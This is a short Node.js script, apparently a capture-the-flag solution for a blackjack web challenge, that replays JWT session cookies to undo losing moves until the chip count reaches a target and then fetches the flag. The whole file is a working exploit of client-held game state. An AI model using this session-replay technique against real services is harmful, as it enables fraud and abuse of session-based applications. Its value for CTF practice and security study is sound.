const fetch = require('node-fetch')

const INITIALIZE = 'initialize'
const HIT = 'hit'
const STAND = 'stand'
const NEXT_GAME = 'nextgame'

const post = async (action, jwt) => {
  const response = await fetch(`http://web.kosenctf.com:14001/${action}`, {
    "headers": {
      "cookie": `matsushima=${jwt}`
    },
    "method": "POST"
  })
  const json = await response.json()

  return [response.headers.get(['set-cookie']).replace(/^matsushima=/, ''), json]
}

const exploit = async () => {
  let [jwt, state] = await post(INITIALIZE, '')

  while (state['chip'] < 999999) {
    console.log(state)
    if (state['player_score'] === -1) {
      [jwt, state] = await post(INITIALIZE, jwt)
      continue
    }

    if (state['player_score'] === 21) {
      let [j, s] = await post(STAND, jwt)
      console.log(s)
      if (s['dealer_score'] !== 21) {
        [jwt, state] = await post(NEXT_GAME, j)
      }
      continue
    }

    if (state['player_score'] < 21) {
      let [j, s] = await post(HIT, jwt)
      if (s['player_score'] !== -1) {
        [jwt, state] = [j, s]
      }
      continue
    }
  }

  const response = await fetch("http://web.kosenctf.com:14001/flag", {
    "headers": {
      "cookie": `matsushima=${jwt}`
    },
    "method": "GET"
  })
  const flag = await response.text()
  console.log(flag)
}

exploit()
